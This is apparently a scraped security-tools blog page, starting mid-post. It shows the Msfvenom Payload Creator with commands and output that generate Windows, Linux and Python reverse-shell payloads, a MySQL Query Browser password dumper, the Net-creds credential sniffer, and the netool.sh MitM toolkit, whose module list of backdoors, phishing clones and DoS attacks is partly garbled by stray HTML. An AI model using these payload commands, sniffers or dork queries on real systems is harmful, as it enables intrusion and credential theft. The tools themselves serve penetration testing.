      <br> 
      <pre><code><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d2a0bdbda692b9b3bebb">[email&nbsp;protected]</a>:~# mpc -h -v
 [*] Msfvenom Payload Creator (MPC v1.3)

 [i] /usr/bin/mpc &lt;TYPE&gt; (&lt;DOMAIN/IP&gt;) (&lt;PORT&gt;) (&lt;CMD/MSF&gt;) (&lt;BIND/REVERSE&gt;) (&lt;STAGED/STAGELESS&gt;) (&lt;TCP/HTTP/HTTPS/FIND_PORT&gt;) (&lt;BATCH/LOOP&gt;) (&lt;VERBOSE&gt;)
 [i]   Example: /usr/bin/mpc windows 192.168.1.10        # Windows &amp; manual IP.
 [i]            /usr/bin/mpc elf eth0 4444               # Linux, eth0's IP &amp; manual port.
 [i]            /usr/bin/mpc stageless cmd py verbose    # Python, stageless command prompt.
 [i]            /usr/bin/mpc loop eth1                   # A payload for every type, using eth1's IP.
 [i]            /usr/bin/mpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
 [i]            /usr/bin/mpc help verbose                # This help screen, with even more information.

 [i] &lt;TYPE&gt;:
 [i]   + ASP
 [i]   + ASPX
 [i]   + Bash [.sh]
 [i]   + Java [.jsp]
 [i]   + Linux [.elf]
 [i]   + OSX [.macho]
 [i]   + Perl [.pl]
 [i]   + PHP
 [i]   + Powershell [.ps1]
 [i]   + Python [.py]
 [i]   + Tomcat [.war]
 [i]   + Windows [.exe]

 [i] Rather than putting &lt;DOMAIN/IP&gt;, you can do a interface and MPC will detect that IP address.
 [i] Missing &lt;DOMAIN/IP&gt; will default to the IP menu.

 [i] Missing &lt;PORT&gt; will default to 443.

 [i] &lt;CMD&gt; is a standard/native command prompt/terminal to interactive with.
 [i] &lt;MSF&gt; is a custom cross platform Meterpreter shell, gaining the full power of Metasploit.
 [i] Missing &lt;CMD/MSF&gt; will default to &lt;MSF&gt; where possible.
 [i]   Note: Metasploit doesn't (yet!) support &lt;CMD/MSF&gt; for every &lt;TYPE&gt; format.
 [i] &lt;CMD&gt; payloads are generally smaller than &lt;MSF&gt; and easier to bypass EMET. Limit Metasploit post modules/scripts support.
 [i] &lt;MSF&gt; payloads are generally much larger than &lt;CMD&gt;, as it comes with more features.

 [i] &lt;BIND&gt; opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.
 [i] &lt;REVERSE&gt; makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.
 [i] Missing &lt;BIND/REVERSE&gt; will default to &lt;REVERSE&gt;.
 [i] &lt;BIND&gt; allows for the attacker to connect whenever they wish. &lt;REVERSE&gt; needs to the target to be repeatedly connecting back to permanent maintain access.

 [i] &lt;STAGED&gt; splits the payload into parts, making it smaller but dependent on Metasploit.
 [i] &lt;STAGELESS&gt; is the complete standalone payload. More 'stable' than &lt;STAGED&gt;.
 [i] Missing &lt;STAGED/STAGELESS&gt; will default to &lt;STAGED&gt; where possible.
 [i]   Note: Metasploit doesn't (yet!) support &lt;STAGED/STAGELESS&gt; for every &lt;TYPE&gt; format.
 [i] &lt;STAGED&gt; are 'better' in low-bandwidth/high-latency environments.
 [i] &lt;STAGELESS&gt; are seen as 'stealthier' when bypassing Anti-Virus protections. &lt;STAGED&gt; may work 'better' with IDS/IPS.
 [i] More information: https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads
 [i]                   https://www.offensive-security.com/metasploit-unleashed/payload-types/
 [i]                   https://www.offensive-security.com/metasploit-unleashed/payloads/

 [i] &lt;TCP&gt; is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.
 [i] &lt;HTTP&gt; makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.
 [i] &lt;HTTPS&gt; makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.
 [i] &lt;FIND_PORT&gt; will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on &lt;TYPE&gt;.
 [i] Missing &lt;TCP/HTTP/HTTPS/FIND_PORT&gt; will default to &lt;TCP&gt;.
 [i] By altering the traffic, such as &lt;HTTP&gt; and even more &lt;HTTPS&gt;, it will slow down the communication &amp; increase the payload size.
 [i] More information: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication

 [i] &lt;BATCH&gt; will generate as many combinations as possible: &lt;TYPE&gt;, &lt;CMD + MSF&gt;, &lt;BIND + REVERSE&gt;, &lt;STAGED + STAGLESS&gt; &amp; &lt;TCP + HTTP + HTTPS + FIND_PORT&gt;
 [i] &lt;LOOP&gt; will just create one of each &lt;TYPE&gt;.

 [i] &lt;VERBOSE&gt; will display more information.
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3e4c51514a7e555f5257">[email&nbsp;protected]</a>:~#
</code></pre> 
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Example #1 (Windows, Fully Automated With IP)</span></b>
      </div> 
      <pre><code><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="cfbda0a0bb8fa4aea3a6">[email&nbsp;protected]</a>:~# mpc windows 192.168.1.10
 [*] Msfvenom Payload Creator (MPC v1.3)
 [i]   IP: 192.168.1.10
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe --platform windows -a x86 -e generic/none LHOST=192.168.1.10 LPORT=443 &gt; /root/windows-meterpreter-staged-reverse-tcp-443.exe
 [i] File (/root/windows-meterpreter-staged-reverse-tcp-443.exe) already exists. Overwriting...
 [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.exe'
 [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'   (msfconsole -q -r /root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)
 [?] Quick web server for file transfer?   python -m SimpleHTTPServer 8080
 [*] Done!
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="71031e1e05311a101d18">[email&nbsp;protected]</a>:~#</code></pre> 
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Example #2 (Linux Format, Fully Automated With Interface and Port)</span></b>
      </div> 
      <pre><code><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0775686873476c666b6e">[email&nbsp;protected]</a>:~# ./mpc elf eth0 4444
 [*] Msfvenom Payload Creator (MPC v1.3)
 [i]   IP: 192.168.103.238
 [i] PORT: 4444
 [i] TYPE: linux (linux/x86/shell/reverse_tcp)
 [i]  CMD: msfvenom -p linux/x86/shell/reverse_tcp -f elf --platform linux -a x86 -e generic/none LHOST=192.168.103.238 LPORT=4444 &gt; /root/linux-shell-staged-reverse-tcp-4444.elf
 [i] linux shell created: '/root/linux-shell-staged-reverse-tcp-4444.elf'
 [i] MSF handler file: '/root/linux-shell-staged-reverse-tcp-4444-elf.rc'   (msfconsole -q -r /root/linux-shell-staged-reverse-tcp-4444-elf.rc)
 [?] Quick web server for file transfer?   python -m SimpleHTTPServer 8080
 [*] Done!
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="aad8c5c5deeac1cbc6c3">[email&nbsp;protected]</a>:~#</code></pre> 
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Example #3 (Python Format, Stageless Command Prompt Using Interactive IP Menu)</span></b>
      </div> 
      <pre><code><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="aedcc1c1daeec5cfc2c7">[email&nbsp;protected]</a>:~# mpc stageless cmd py verbose
 [*] Msfvenom Payload Creator (MPC v1.3)

 [i] Use which interface/IP address?:
 [i]   1.) eth0 - 192.168.103.238
 [i]   2.) eth1 - 192.168.155.175
 [i]   3.) tap0 - 10.10.100.63
 [i]   4.) lo - 127.0.0.1
 [i]   5.) wan - xx.xx.xx.xx
 [?] Select 1-5, interface or IP address: 3

 [i]        IP: 10.10.100.63
 [i]      PORT: 443
 [i]      TYPE: python (python/shell_reverse_tcp)
 [i]     SHELL: shell
 [i] DIRECTION: reverse
 [i]     STAGE: stageless
 [i]    METHOD: tcp
 [i]       CMD: msfvenom -p python/shell_reverse_tcp -f raw --platform python -e generic/none -a python LHOST=10.10.100.63 LPORT=443 &gt; /root/python-shell-stageless-reverse-tcp-443.py
 [i] python shell created: '/root/python-shell-stageless-reverse-tcp-443.py'
 [i] File: ASCII text, with very long lines, with no line terminators
 [i] Size: 4.0K
 [i]  MD5: 53452eafafe21bff94e6c4621525165b
 [i] SHA1: 18641444f084c5fe7e198c29bf705a68b15c2cc9
 [i] MSF handler file: '/root/python-shell-stageless-reverse-tcp-443-py.rc'   (msfconsole -q -r /root/python-shell-stageless-reverse-tcp-443-py.rc)
 [?] Quick web server for file transfer?   python -m SimpleHTTPServer 8080
 [*] Done!
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="afddc0c0dbefc4cec3c6">[email&nbsp;protected]</a>:~#</code></pre> 
      <br> 
      <b><span style="font-size: large;">To-Do List</span></b>
      <br> 
      <ul> 
       <li>Shellcode generation</li> 
       <li>x64 payloads</li> 
       <li>IPv6 support</li> 
       <li>Look into using OS scripting more <em>(<code>powershell_bind_tcp</code> &amp; <code>bind_perl</code> etc)</em></li> 
      </ul> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/g0tmi1k/mpc" target="_blank">Download&nbsp;Msfvenom Payload Creator</a></span></b>
      </div>

    <article class="post hentry" id="517648341919218988" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> MySQL Query Browser Password Dump - Command-line Tool to Recover Lost or Forgotten Passwords from MySQL Query Browser  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-517648341919218988" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-nGIKs9EZ7_Y/VV3wsU5R1iI/AAAAAAAAEEE/OzNGnmzt698/s1600/mysqlquerybrowserpassworddump.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="410" src="http://4.bp.blogspot.com/-nGIKs9EZ7_Y/VV3wsU5R1iI/AAAAAAAAEEE/OzNGnmzt698/s640/mysqlquerybrowserpassworddump.jpg" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;"> 
       <strong>MySQL Query Browser Password Dump</strong> is the free command-line tool to instantly recover your lost or forgotten passwords from MySQL Query Browser software.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        MySQL Query Browser is a simple software to manage your MySQL database connections and queries. By default, it stores all the database login details so that user don't have enter it everytime.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        Our tool helps you to quickly find and decode all the login username &amp; password details for each database. For each of the recovered MySQL database connection, it displays following details, 
      </div> 
      <ul> 
       <li style="text-align: justify;">Login Username</li> 
       <li style="text-align: justify;"> Login Password</li> 
       <li style="text-align: justify;"> Database Schema</li> 
       <li style="text-align: justify;"> MySQL Port</li> 
       <li style="text-align: justify;"> MySQL Host/Server Address</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        It operates in both 
       <strong>automatic and manual</strong> mode. You can ask it to auto detect password file from default location of MySQL Query Browser or manually provide one. This way, you can not only recover database passwords from local system but also from a file copied from 
       <strong>remote system</strong> easily.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Being 
       <strong>command-line</strong> tool makes it ideal tool for penetration testers and 
       <strong>forensic investigators</strong>. It is fully portable and also includes installer to help you in local installation &amp; un-installation.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        MySQL Query Browser Password Dumpp works on both 32-bit &amp; 64-bit platforms starting from Windows XP to 
       <strong>Windows 8</strong>. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="http://securityxploded.com/mysql-query-browser-password-dump.php" target="_blank">Download&nbsp;MySQL Query Browser Password Dump</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="5371278060594730917" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Net-creds - Sniff passwords and hashes from an interface or pcap file  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-5371278060594730917" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-Z9ioytqy95I/VTPtylXMnfI/AAAAAAAAD4Y/43MvU-qvs1E/s1600/net-creds_1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-Z9ioytqy95I/VTPtylXMnfI/AAAAAAAAD4Y/43MvU-qvs1E/s640/net-creds_1.png"></a>
      </div> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <br>
      </div> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-iFsZOB5eSRA/VTPt0D2bbGI/AAAAAAAAD4g/y33gcoVCZ7w/s1600/net-creds_2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-iFsZOB5eSRA/VTPt0D2bbGI/AAAAAAAAD4g/y33gcoVCZ7w/s640/net-creds_2.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Thoroughly sniff passwords and hashes from an interface or pcap file. Concatenates fragmented packets and does not rely on ports for service identification.
      </div> 
      <a name="more"></a>
      <br> 
      <b><span style="font-size: large;">Sniffs</span></b>
      <br> 
      <ul class="task-list"> 
       <li>URLs visited</li> 
       <li>POST loads sent</li> 
       <li>HTTP form logins/passwords</li> 
       <li>HTTP basic auth logins/passwords</li> 
       <li>HTTP searches</li> 
       <li>FTP logins/passwords</li> 
       <li>IRC logins/passwords</li> 
       <li>POP logins/passwords</li> 
       <li>IMAP logins/passwords</li> 
       <li>Telnet logins/passwords</li> 
       <li>SMTP logins/passwords</li> 
       <li>SNMP community string</li> 
       <li>NTLMv1/v2 all supported protocols like HTTP, SMB, LDAP, etc</li> 
       <li>Kerberos</li> 
      </ul> 
      <br> 
      <b><span style="font-size: large;">Examples</span></b>
      <br> 
      <br> Auto-detect the interface to sniff
      <br> 
      <pre><code>sudo python net-creds.py</code></pre> Choose eth0 as the interface
      <br> 
      <pre><code>sudo python net-creds.py -i eth0</code></pre> Ignore packets to and from 192.168.0.2
      <br> 
      <pre><code>sudo python net-creds.py -f 192.168.0.2</code></pre> Read from pcap
      <br> 
      <pre><code>python net-creds.py -p pcapfile</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/DanMcInerney/net-creds" target="_blank">Download&nbsp;Net-creds</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="5747775824676024653" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> netool.sh - MitM Pentesting Opensource T00lkit  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-5747775824676024653" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-GGooe4cU9gA/VQJY-cHC6HI/AAAAAAAADyI/s_XAHtxuo7A/s1600/netool.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-GGooe4cU9gA/VQJY-cHC6HI/AAAAAAAADyI/s_XAHtxuo7A/s1600/netool.png" height="400" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        netool.sh toolkit provides a fast and easy way For new arrivals to IT security pentesting and also to experience users to use allmost all features that the Man-In-The-Middle can provide under local lan, since scanning, sniffing and social engeneering attacks "[spear phishing attacks]"...
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: center;"> 
       <iframe allowfullscreen frameborder="0" height="360" src="https://www.youtube.com/embed/mMI-P2bVvRQ" width="480"></iframe> 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span class="Apple-style-span" style="font-size: large;">DESCRIPTION</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <b>"Scanning - Sniffing - Social Engeneering"</b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Netool: its a toolkit written using 'bash, python, ruby' that allows you to automate frameworks like Nmap, Driftnet, Sslstrip, Metasploit and Ettercap MitM attacks. this toolkit makes it easy tasks such as SNIFFING tcp/udp traffic, Man-In-The-Middle attacks, SSL-sniff, DNS-spoofing, D0S attacks in wan/lan networks, TCP/UDP packet manipulation using etter-filters, and gives you the ability to capture pictures of target webbrowser surfing (driftnet) also uses macchanger to decoy scans changing the mac address.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Rootsector: module allows you to automate some attacks over DNS_SPOOF + MitM (phishing - social engineering) using metasploit, apache2 and ettercap frameworks. like the generation of payloads,shellcode,backdoors delivered using dns_spoof and MitM method to redirect a target to your phishing webpage.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Recently was introduced "inurlbr" webscanner (by cleiton) that allow us to search SQL related bugs, using severeal search engines, also this framework can be used in conjunction with other frameworks like nmap, (using the flag --comand-vul)&nbsp;
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Example: 
       <b>inurlbr.php -q 1,2,10 --dork 'inurl:index.php?id=' --exploit-get ?´0x27 -s report.log --comand-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_' </b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span class="Apple-style-span" style="font-size: large;">Operative Systems Supported</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Linux-Ubuntu | Linux-kali | Parrot security OS | blackbox OS Linux-backtrack (un-continued) | Mac osx (un-continued).
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span class="Apple-style-span" style="font-size: large;">Dependencies</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <b><br></b>
      </div> 
      <div style="text-align: justify;"> 
       <b>"TOOLKIT DEPENDENCIES"</b>
      </div> 
      <div style="text-align: justify;">
        zenity | Nmap | Ettercap | Macchanger | Metasploit | Driftnet | Apache2 | sslstrip
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>"SCANNER INURLBR.php"</b>
      </div> 
      <div style="text-align: justify;">
        curl | libcurl3 | libcurl3-dev | php5 | php5-cli | php5-curl
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        * Install zenity | Install nmap | Install ettercap | Install macchanger | Install metasploit | Install Apache2 *
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span class="Apple-style-span" style="font-size: large;">Features (modules)</span></b>
      </div> 
      <pre><code>  "1-Show Local Connections"
  "2-Nmap Scanner menu"
        -&gt;
        Ping target
        Show my Ip address
        See/change mac address
        change my PC hostname
        Scan Local network 
        Scan external lan for hosts
        Scan a list of targets (list.txt)          
        Scan remote host for vulns          
        Execute Nmap command
        Search for target geolocation
        ping of dead (DoS)
        Norse (cyber attacks map)
        nmap Nse vuln modules
        nmap Nse discovery modules
        &lt;- data-blogger-escaped--="" data-blogger-escaped-addon="" data-blogger-escaped-config="" data-blogger-escaped-etrieve="" data-blogger-escaped-firefox="" data-blogger-escaped-metadata="" data-blogger-escaped-p="" data-blogger-escaped-pen="" data-blogger-escaped-router="" data-blogger-escaped-tracer="" data-blogger-escaped-webcrawler="" data-blogger-escaped-whois=""&gt;
        retrieve metadata from target website
        retrieve using a fake user-agent
        retrieve only certain file types
        &lt;- data-blogger-escaped--="" data-blogger-escaped-php="" data-blogger-escaped-webcrawler=""&gt; 
        scanner inurlbr.php -&gt; Advanced search with multiple engines, provided
        analysis enables to exploit GET/POST capturing emails/urls &amp; internal
        custom validation for each target/url found. also the ability to use
        external frameworks in conjuction with the scanner like nmap,sqlmap,etc
        or simple the use of external scripts.
        &lt;- data-blogger-escaped--="" data-blogger-escaped-automated="" data-blogger-escaped-engeneering="" data-blogger-escaped-exploits="" data-blogger-escaped-phishing="" data-blogger-escaped-r00tsect0r="" data-blogger-escaped-social=""&gt;
        package.deb backdoor [Binary linux trojan]
        Backdooring EXE Files [Backdooring EXE Files]
        fakeupdate.exe [dns-spoof phishing backdoor]
        meterpreter powershell invocation payload [by ReL1K]
        host a file attack [dns_spoof+mitm-hosted file]
        clone website [dns-spoof phishing keylooger]
        Java.jar phishing [dns-spoof+java.jar+phishing]
        clone website [dns-spoof + java-applet]
        clone website [browser_autopwn phishing Iframe]
        Block network access [dns-spoof]
        Samsung TV DoS [Plasma TV DoS attack]
        RDP DoS attack [Dos attack against target RDP]
        website D0S flood [Dos attack using syn packets]
        firefox_xpi_bootstarpped_addon automated exploit
        PDF backdoor [insert a payload into a PDF file]
        Winrar backdoor (file spoofing)
        VBScript injection [embedded a payload into a world document]
        ".::[ normal payloads ]::."
        windows.exe payload
        mac osx payload
        linux payload
        java signed applet [multi-operative systems]
        android-meterpreter [android smartphone payload]
        webshell.php [webshell.php backdoor]
        generate shellcode [C,Perl,Ruby,Python,exe,war,vbs,Dll,js]
        Session hijacking [cookie hijacking]
        start a lisenner [multi-handler]
        &lt;- data-blogger-escaped-a.="" data-blogger-escaped-about="" data-blogger-escaped-access="" data-blogger-escaped-attack="" data-blogger-escaped-aunch="" data-blogger-escaped-c.="" data-blogger-escaped-check="" data-blogger-escaped-code="" data-blogger-escaped-config="" data-blogger-escaped-cupp.py="" data-blogger-escaped-d.="" data-blogger-escaped-database="" data-blogger-escaped-db.="" data-blogger-escaped-delete="" data-blogger-escaped-etter.filters="" data-blogger-escaped-ettercap="" data-blogger-escaped-execute="" data-blogger-escaped-files="" data-blogger-escaped-filter="" data-blogger-escaped-folders="" data-blogger-escaped-for="" data-blogger-escaped-hare="" data-blogger-escaped-how="" data-blogger-escaped-lan="" data-blogger-escaped-local="" data-blogger-escaped-lock="" data-blogger-escaped-mitm="" data-blogger-escaped-netool="" data-blogger-escaped-niff="" data-blogger-escaped-ns-spoofing="" data-blogger-escaped-ommon="" data-blogger-escaped-ompile="" data-blogger-escaped-on="" data-blogger-escaped-onfig="" data-blogger-escaped-os="" data-blogger-escaped-password="" data-blogger-escaped-passwords="" data-blogger-escaped-pics="" data-blogger-escaped-profiler="" data-blogger-escaped-q.="" data-blogger-escaped-quit="" data-blogger-escaped-remote="" data-blogger-escaped-ssl="" data-blogger-escaped-toolkit="" data-blogger-escaped-u.="" data-blogger-escaped-updates="" data-blogger-escaped-urls="" data-blogger-escaped-user="" data-blogger-escaped-visited=""&gt;
        <!---->
        <!---->
        <!---->
        <!----></code></pre> 
      <br> 
      <br> 
      <b><span class="Apple-style-span" style="font-size: large;">Screenshots</span></b>
      <br>
